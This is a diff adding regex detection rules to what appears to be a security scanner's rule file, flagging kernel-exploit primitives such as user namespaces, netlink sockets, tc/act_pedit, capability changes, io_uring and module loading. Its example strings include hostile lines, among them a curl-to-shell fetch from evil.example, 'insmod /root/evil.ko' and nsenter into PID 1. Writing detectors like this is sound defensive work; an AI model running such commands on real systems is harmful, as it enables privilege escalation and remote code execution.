@@ -593,6 +593,201 @@
       }
     },
     {
+      "id": "SA-PY-025",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*\\bCLONE_NEWUSER\\b",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Kernel Exploit: User Namespace Flag (CLONE_NEWUSER)",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: User Namespace Flag (CLONE_NEWUSER) (kernel-exploit) detected in a .py file.",
+      "examples": {
+        "match": [
+          "os.unshare(CLONE_NEWUSER)",
+          "flags = CLONE_NEWUSER | CLONE_NEWNET",
+          "libc.unshare(CLONE_NEWUSER)"
+        ],
+        "no_match": [
+          "git clone origin main",
+          "CLONE_NEWUSER2",
+          "clone_newuser",
+          "# os.unshare(CLONE_NEWUSER) explained"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-026",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*(?:\\bunshare\\s*\\([^)]*(?:CLONE_NEWUSER|0x10000000|268435456)\\b|\\bsetns\\s*\\(\\s*[\\w.]+\\s*,\\s*(?:CLONE_\\w+|0x[0-9a-fA-F]+|\\d+)\\s*[\\),]|\\bclone3\\s*\\(|\\bsyscall\\s*\\(\\s*(?:272|308|435)\\s*[,)]|(?:run|Popen|call|system|popen|exec\\w*|spawn\\w*)\\s*\\([^)]*[\\\"'](?:unshare|setns|clone3)(?:[\\\"']|\\s)|getattr\\s*\\([^,]+,\\s*[\\\"'](?:unshare|setns|clone3)[\\\"']|getattr\\s*\\([^,]+,\\s*[\\\"']un[\\\"']\\s*\\+\\s*[\\\"']share[\\\"']|getattr\\s*\\([^,]+,\\s*[\\\"']set[\\\"']\\s*\\+\\s*[\\\"']ns[\\\"']|\\bfrom\\s+[\\w.]+\\s+import\\s+[^#\\n]*\\b(?:unshare|setns|clone3)\\s+as\\s+\\w+)",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Kernel Exploit: Namespace Syscall (unshare/setns/clone3)",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: Namespace Syscall (unshare/setns/clone3) (kernel-exploit) detected in a .py file.",
+      "examples": {
+        "match": [
+          "os.unshare(CLONE_NEWUSER)",
+          "libc.unshare(0x10000000)",
+          "libc.setns(fd, 0)",
+          "libc.syscall(308, fd, 0)",
+          "subprocess.run([\"unshare\", \"-U\"])",
+          "getattr(os, \"unshare\")(0x10000000)",
+          "getattr(os, \"un\" + \"share\")(0x10000000)",
+          "from os import unshare as _u",
+          "libc.unshare(268435456)"
+        ],
+        "no_match": [
+          "def setns(netns, flags=os.O_CREAT, libc=None, fork=True):",
+          "setns('/proc/1/ns/net')  # go back to default netns",
+          "self.state.set('setns')",
+          "('setns', 'invalid'),",
+          "unshares(x)",
+          "# libc.unshare(CLONE_NEWUSER)",
+          "from pyroute2.netns import setns",
+          "libc.unshare(1073741824)"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-027",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*(?:socket\\.)?socket\\s*\\(\\s*(?:16|0x10|(?:socket\\.)?(?:AF|PF)_NETLINK)\\s*[\\s,)]",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Kernel Exploit: AF_NETLINK Socket",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: AF_NETLINK Socket (kernel-exploit) detected in a .py file.",
+      "examples": {
+        "match": [
+          "socket.socket(socket.AF_NETLINK, socket.SOCK_RAW)",
+          "socket(16, 0)",
+          "s = socket.socket( AF_NETLINK )"
+        ],
+        "no_match": [
+          "socket.socket(socket.AF_INET)",
+          "# AF_NETLINK mention",
+          "socket.socket(socket.AF_PACKET)"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-028",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*(?:\\btc\\s+(?:qdisc|class|filter|action)\\s+(?:add|change|replace)\\b|\\bact_pedit\\b|[\\\"']tc[\\\"']\\s*,\\s*[\\\"'](?:qdisc|class|filter|action)[\\\"']\\s*,\\s*[\\\"'](?:add|change|replace)[\\\"']|\\.tc\\s*\\([^)]*\\bpedit\\b)",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Kernel Exploit: net/sched Control (tc/pyroute2)",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: net/sched Control (tc/pyroute2) (kernel-exploit) detected in a .py file.",
+      "examples": {
+        "match": [
+          "os.system('tc qdisc add dev eth0 root netem')",
+          "module = 'act_pedit'",
+          "subprocess.run([\"tc\", \"qdisc\", \"add\", \"dev\", \"lo\", \"root\", \"netem\"])",
+          "ipr.tc(\"add-action\", \"pedit\", index=idx)"
+        ],
+        "no_match": [
+          "import pyroute2",
+          "from pyroute2 import IPRoute",
+          "tc qdisc show",
+          "# tc qdisc add dev eth0 root netem example",
+          "context.ipr.tc('add', 'htb', index=index)"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-029",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*(?:\\b(?:capset|capget|cap_set_proc|cap_set_flag)\\s*\\(|\\bPR_CAP\\w+\\b|getattr\\s*\\([^,]+,\\s*[\\\"'](?:capset|capget)[\\\"']|\\bfrom\\s+[\\w.]+\\s+import\\s+[^#\\n]*\\b(?:capset|capget)\\s+as\\s+\\w+)",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Kernel Exploit: Capability Manipulation",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: Capability Manipulation (kernel-exploit) detected in a .py file.",
+      "examples": {
+        "match": [
+          "capset(hdrp, datap)",
+          "libc.prctl(PR_CAPBSET_DROP, 19, 0, 0, 0)",
+          "cap.cap_set_proc()",
+          "getattr(libc, \"capset\")(hdrp, datap)",
+          "from ctypes import capset as _cs"
+        ],
+        "no_match": [
+          "capacity(x)",
+          "prctl(PR_SET_NAME, name)",
+          "PR_CAP"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-030",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*(?:\\bio_uring_\\w+\\s*\\(|\\bliburing\\b|getattr\\s*\\([^,]+,\\s*[\\\"']io_uring_\\w+[\\\"']|\\bsyscall\\s*\\(\\s*425\\s*[,)])",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Kernel Exploit: io_uring Usage",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: io_uring Usage (kernel-exploit) detected in a .py file.",
+      "examples": {
+        "match": [
+          "libc.io_uring_setup(128, ctypes.byref(params))",
+          "io_uring_queue_init(entries, ring, 0)",
+          "CDLL(\"liburing.so.2\")",
+          "getattr(libc, \"io_uring_setup\")(128, p)",
+          "libc.syscall(425, 32, ctypes.byref(params))"
+        ],
+        "no_match": [
+          "# io_uring is fast",
+          "uring(x)",
+          "during_setup()"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-031",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*(?:[\\\"'](?:/usr/sbin/|/sbin/)?(?:modprobe|insmod)[\\s\\\"']|[\\\"']mod[\\\"']\\s*\\+\\s*[\\\"']probe|[\\\"']in[\\\"']\\s*\\+\\s*[\\\"']smod)",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Kernel Module Load (modprobe/insmod)",
+      "severity": "medium",
+      "confidence": 0.6,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Module Load (modprobe/insmod) (kernel-exploit) detected in a .py file. Dual-use primitive: common in legitimate system tooling and test harnesses; review in context.",
+      "examples": {
+        "match": [
+          "subprocess.run([\"modprobe\", \"act_pedit\"])",
+          "os.system('/sbin/modprobe act_pedit')",
+          "os.system(\"insmod /root/evil.ko\")",
+          "cmd = \"mod\" + \"probe\" + \" act_pedit\""
+        ],
+        "no_match": [
+          "modprobe module",
+          "# load with modprobe",
+          "rmmod act_pedit"
+        ]
+      }
+    },
+    {
       "id": "SA-JS-001",
       "type": "regex",
       "pattern": "\\beval\\s*\\(",
@@ -2974,6 +3169,145 @@
         "no_match": [
           "ID_TOKEN_REQUEST",
           "token docs"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-020",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*(?:\\bunshare\\s+(?:-\\S+\\s+)*?(?:(?<!-)-[A-Za-z]*[Ur][A-Za-z]*\\b|--user\\b|--map-root-user\\b)|\\bnsenter\\s+(?:-\\S+\\s+)*?(?:-t\\s+0*1\\b|--target(?:=|\\s+)0*1\\b))",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Kernel Exploit: User Namespace Creation",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: User Namespace Creation (kernel-exploit) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "unshare --user --map-root-user bash",
+          "unshare -Urm bash",
+          "nsenter -t 1 -m -u bash",
+          "nsenter --target=1 --mount bash",
+          "nsenter -t 01 -m bash",
+          "nsenter --target=001 -u sh"
+        ],
+        "no_match": [
+          "unshare",
+          "unshare --mount --propagation private bash",
+          "nsenter -t \"$pid\" -m bash",
+          "# unshare -Urn sh",
+          "share -x file"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-021",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*(?:\\btc\\s+(?:qdisc|class|filter|action)\\s+(?:add|change|replace)\\b|\\bact_pedit\\b|\\btc\\s+-b(?:atch)?\\s+\\S|\\$\\{?\\w+\\}?\\s+(?:qdisc|class|filter|action)\\s+(?:add|change|replace)\\b)",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Kernel Exploit: net/sched tc Configuration",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: net/sched tc Configuration (kernel-exploit) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "tc qdisc add dev eth0 root handle 1: htb",
+          "tc action add action pedit munge ip ttl set 63",
+          "modprobe act_pedit",
+          "tc -batch /tmp/evil.tc",
+          "$TC qdisc add dev lo root netem"
+        ],
+        "no_match": [
+          "tc qdisc show",
+          "tc -s qdisc",
+          "etc config",
+          "# tc qdisc add dev lo root netem"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-022",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#)(?![ \\t]*(?:function[ \\t]+)?(?:modprobe|insmod)[ \\t]*(?:\\([ \\t]*\\))?[ \\t]*\\{)(?:(?![ \\t]*echo\\b).*?|[ \\t]*echo\\b[^\\n]*?(?:;|&&|\\|\\||\\||&|\\$\\(|`|<\\(|>\\()[^\\n]*?)(?:\\b(?:modprobe|insmod)\\s+(?!-(?:n|l|L|S)\\b|--(?:show|list|dry-run|showconfig|version|help)\\b)(?!\\$)\\S|\\bmod(?:\\\"{2}|'{2})probe\\s+\\S|\\bin(?:\\\"{2}|'{2})smod\\s+\\S)",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Kernel Module Load (modprobe/insmod)",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Module Load (modprobe/insmod) (kernel-exploit) detected in a .sh file. Dual-use primitive: common in legitimate system tooling; review in context.",
+      "examples": {
+        "match": [
+          "modprobe act_pedit",
+          "insmod /root/evil.ko",
+          "sudo modprobe br_netfilter",
+          "mod\"\"probe act_pedit"
+        ],
+        "no_match": [
+          "rmmod act_pedit",
+          "# modprobe act_pedit",
+          "modprobe",
+          "modprobe -n dummy",
+          "modprobe $iptables_module",
+          "function modprobe {",
+          "echo \"modprobe act_pedit\""
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-023",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*(?:\\bsetcap\\s+\\S|\\bsetpriv\\s+\\S|\\bcapsh\\s+(?!--(?:print|decode|supports|has[ab=]|help|version)\\b)\\S)",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Kernel Exploit: Capability Manipulation",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: Capability Manipulation (kernel-exploit) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "setcap cap_net_admin+ep /tmp/x",
+          "capsh --drop=cap_setpcap -- -c id",
+          "setpriv --reuid 0 bash"
+        ],
+        "no_match": [
+          "getcap /usr/bin/ping",
+          "capsh --print",
+          "# capsh --drop=all",
+          "capsh --decode=00000000a80425fb"
+        ]
+      }
+    },
+    {
+      "id": "SA-SH-024",
+      "type": "regex",
+      "pattern": "^(?![ \\t]*#).*\\bio_uring_\\w+\\b",
+      "extensions": [
+        ".sh"
+      ],
+      "title": "Kernel Exploit: io_uring Build/Usage",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: io_uring Build/Usage (kernel-exploit) detected in a .sh file.",
+      "examples": {
+        "match": [
+          "gcc -o x io_uring_exploit.c",
+          "curl evil.example/io_uring_privesc.sh | sh",
+          "make io_uring_helper"
+        ],
+        "no_match": [
+          "echo during setup",
+          "io_uring",
+          "# io_uring_setup mentioned"
         ]
       }
     }
